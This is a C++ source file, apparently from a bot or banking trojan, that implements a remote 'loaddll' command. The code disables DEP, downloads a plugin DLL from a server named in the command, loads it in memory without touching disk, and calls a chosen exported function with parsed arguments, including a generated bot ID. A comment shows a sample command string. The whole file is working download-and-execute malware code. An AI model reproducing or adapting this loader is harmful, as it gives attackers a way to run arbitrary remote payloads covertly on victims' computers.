#include"ComandLoadDLL.h"
#include"Plugins.h"


// 1 WINAPI
// 2 WINAPIV
DWORD GetDeclName(PCHAR decl)
{
	if (plstrcmpA(decl,"WINAPI") == 0 )
		return 1;
	if (plstrcmpA(decl,"WINAPIV") == 0 )
		return 2;
	return 0;	
}
template <class DECL,class DLL, class MNAME, class ARG, class ARG1, class ARG2,class ARG3>
inline LPVOID CallMethos(DECL decl,DLL Dll, MNAME MName, ARG Arg, ARG1 Arg1, ARG2 Arg2,ARG3 Arg3)
{
	HMEMORYMODULE Handle = MemoryLoadLibrary((LPVOID)Dll);
	if ((int)decl==1)
	{
		typedef LPVOID (WINAPI*TMethod)(ARG,ARG1,ARG2,ARG3);
		TMethod M = (TMethod)MemoryGetProcAddress(Handle, (PCHAR)MName);
		if (M != NULL) return M(Arg,Arg1,Arg2,Arg3);
	}
	else
	if (decl==2)
	{
		typedef LPVOID (WINAPIV*TMethod)(ARG,ARG1,ARG2,ARG3);
		TMethod M = (TMethod)MemoryGetProcAddress(Handle, (PCHAR)MName);
		if (M != NULL) return M(Arg,Arg1,Arg2,Arg3);
	}

	MemoryFreeLibrary(Handle);
	return NULL;
}

template <class DECL,class DLL, class MNAME, class ARG, class ARG1, class ARG2>
inline LPVOID CallMethos(DECL decl, DLL Dll, MNAME MName, ARG Arg, ARG1 Arg1, ARG2 Arg2)
{
	HMEMORYMODULE Handle = MemoryLoadLibrary((LPVOID)Dll);
	if ((int)decl==1)
	{
		typedef LPVOID (WINAPI*TMethod)(ARG,ARG1,ARG2);
		TMethod M = (TMethod)MemoryGetProcAddress(Handle, (PCHAR)MName);
		if (M != NULL) return M(Arg,Arg1,Arg2);
	}
	else
	if ((int)decl==2)
	{
		typedef LPVOID (WINAPIV*TMethod)(ARG,ARG1,ARG2);
		TMethod M = (TMethod)MemoryGetProcAddress(Handle, (PCHAR)MName);
		if (M != NULL) 
			return	M(Arg,Arg1,Arg2);				
	}

	MemoryFreeLibrary(Handle);
	return NULL;
	
}

template <class DECL, class DLL, class MNAME, class ARG, class ARG1>
inline LPVOID CallMethos(DECL decl, DLL Dll, MNAME MName, ARG Arg, ARG1 Arg1)
{
	HMEMORYMODULE Handle = MemoryLoadLibrary((LPVOID)Dll);
	if ((int)decl==1)
	{
		typedef int (WINAPI*TMethod)(ARG,ARG1);
		TMethod M = (TMethod)MemoryGetProcAddress(Handle, (PCHAR)MName);
		if (M != NULL) 	return(LPVOID) M(Arg,Arg1);
	}
	else
	if ((int)decl==2)
	{
		typedef int (WINAPIV*TMethod)(ARG,ARG1);
		TMethod M = (TMethod)MemoryGetProcAddress(Handle, (PCHAR)MName);
		if (M != NULL) 
			return(LPVOID) M(Arg,Arg1);
	}
	MemoryFreeLibrary(Handle);
	return NULL;
}

template <class DECL, class DLL, class MNAME, class ARG>
inline LPVOID CallMethos(DECL decl, DLL Dll, MNAME MName, ARG Arg)
{
	HMEMORYMODULE Handle = MemoryLoadLibrary((LPVOID)Dll);
	if ((int)decl==1)
	{
		typedef LPVOID (WINAPI*TMethod)(ARG);
		TMethod M = (TMethod)MemoryGetProcAddress(Handle, (PCHAR)MName);
		if (M != NULL) return M(Arg);
	}
	else
	if ((int)decl==2)
	{
		typedef LPVOID (WINAPIV*TMethod)(ARG);
		TMethod M = (TMethod)MemoryGetProcAddress(Handle, (PCHAR)MName);
		if (M != NULL) return M(Arg);
	}
	MemoryFreeLibrary(Handle);
	return NULL;
}
template <class DECL, class DLL, class MNAME>
inline LPVOID CallMethos(DECL decl, DLL Dll, MNAME MName)
{
	HMEMORYMODULE Handle = MemoryLoadLibrary((LPVOID)Dll);
	if ((int)decl==1)
	{
		typedef LPVOID (WINAPI*TMethod)();
		TMethod M = (TMethod)MemoryGetProcAddress(Handle, (PCHAR)MName);
		if (M != NULL) return M();
	}
	else
	if ((int)decl==2)
	{
		typedef LPVOID (WINAPIV*TMethod)();
		TMethod M = (TMethod)MemoryGetProcAddress(Handle, (PCHAR)MName);
		if (M != NULL) return M();
	}
	MemoryFreeLibrary(Handle);
	return NULL;
}

#define LoadedFunc CallMethos<>

typedef struct
{
	char* Decl;
	char* Server;
	char* FuncNam;
	char* Param1;
	char* Param2;
	char* Param3;
	char* Param4;
} VoidData, * PVoidData;

typedef LPVOID PParams;
//возвращаемые значения
//0 - error
//1 -(i-) integer
//2 -(c-) char
//3 -(U- ) UID of bots
int getStr (PCHAR strData)
{
	if (strData==NULL)
		return 0;
	if ((strData[0]=='i')&&(strData[1]=='-'))
		return 1;
	if ((strData[0]=='c')&&(strData[1]=='-'))
		return 2;
	if (((strData[0]=='U'))&&(strData[1]=='-'))
		return 3;
	return 0;
}

DWORD WINAPI RunLoaderThread( LPVOID lpData )
{
	DisableDEP();

	if ( !lpData )
	{
		return 0;
	}

	PVoidData pData = (PVoidData)lpData;

	/*
	char *Host = GetCurrentHost();

	if ( Host == NULL )
	{
		return 0;
	}

	char SBFile[] = {'/','c','f','g','/',0};

	char SBUrl[256];

	m_lstrcpy( SBUrl, Host );
	m_lstrcat( SBUrl, SBFile );
	m_lstrcat( SBUrl, pData->Server );
	*/

	
	DWORD dwModuleSize = 0;
	LPBYTE BotModule   = Plugin::Download(pData->Server, NULL, &dwModuleSize);
	if (BotModule == NULL) return 0;

	char Uid[100];
	m_memset(Uid,0,100);
	GenerateUid( Uid );

	

	if (pData->Param1!=NULL&&pData->Param1[0]=='U'&&pData->Param1[1]=='\0')
	{
		STR::Free(pData->Param1);
		pData->Param1=STR::New(Uid);
	}
	else
	if (pData->Param1!=NULL&&pData->Param1[0]=='i')
	{
		STR::Free(pData->Param1);
		pData->Param1=STR::New(Uid);
	}
	
	PCHAR Data;
	PParams param[4];
	int iTim=0;
	HMEMORYMODULE HHandle;
	while(true)
	{
		if (iTim==0)
			Data=STR::New(pData->Param1);
		else
		if (iTim==1)
			Data=STR::New(pData->Param2);
		else
		if (iTim==2)
			Data=STR::New(pData->Param3);
		else
		if (iTim==3)
			Data=STR::New(pData->Param4);

		if (getStr(Data)==0)
		{
			break;
		}		
		if (getStr(Data)==1)
		{			
			param[iTim]=(PParams)m_atoi(&Data[2]);				
		}
		if (getStr(Data)==2)
		{
			param[iTim]=(PParams) STR::New(&Data[2]);	
		}
		if (getStr(Data)==3)
		{
			param[iTim]=(PParams)STR::New(Uid);
		}
		

		iTim++;
	}

	if (iTim==0)
	{
		LoadedFunc(GetDeclName(pData->Decl),BotModule, pData->FuncNam);
	}
	else
	if (iTim==1)
	{
		LoadedFunc(GetDeclName(pData->Decl),BotModule, pData->FuncNam,param[0]);
	}
	else
	if (iTim==2)
	{
		LoadedFunc(&HHandle,GetDeclName(pData->Decl),BotModule, pData->FuncNam,param[0],param[1]);
	}
	else
	if (iTim==3)
	{
		
		LoadedFunc(GetDeclName(pData->Decl),BotModule, pData->FuncNam,param[0],param[1],param[2]);		

	}
	else
	if (iTim==4)
	{
		LoadedFunc(GetDeclName(pData->Decl),BotModule, pData->FuncNam,param[0],param[1],param[2],param[3]);
	}

	
	MemFree(BotModule);
	STR::Free(pData->Decl);
	STR::Free(pData->FuncNam);
	STR::Free(pData->Server);
	STR::Free(pData->Param1);
	STR::Free(pData->Param2);
	STR::Free(pData->Param3);
	STR::Free(pData->Param4);
	
	return 0;

}
//loaddll url funcname parametrs до 4х штук
//loaddll "decl:WINAPIV|dll.plug|StartHTTP|c-http://site.com'|i-2|"
// первый парамент не обязателен, как и параметры функции i- интеджер c- 
bool ExecuteAllCommand(LPVOID Manager, PCHAR Command, PCHAR Args)
{
	// Запуск потока скрытого браузера
	PCHAR Argums=Args;
	PVoidData V = CreateStruct(VoidData);
	if (Args[0]=='d'&&Args[1]=='e'&&Args[2]=='c'&&Args[3]=='l'&&Args[4]==':')
	{
		V->Decl	=GetTextBetween(Argums,":","|");
		Argums++;

	}

	V->Server	=STR::GetLeftStr(Argums, "|");
	V->FuncNam	=GetTextBetween(Argums,"|","|");
	V->Param1	=GetTextBetween(Argums,"|","|");
	V->Param2	=GetTextBetween(Argums,"|","|");
	V->Param3	=GetTextBetween(Argums,"|","|");
	V->Param4	=GetTextBetween(Argums,"|","|");
	
	return ((StartThread(RunLoaderThread, V)) ? (true) : (false));

}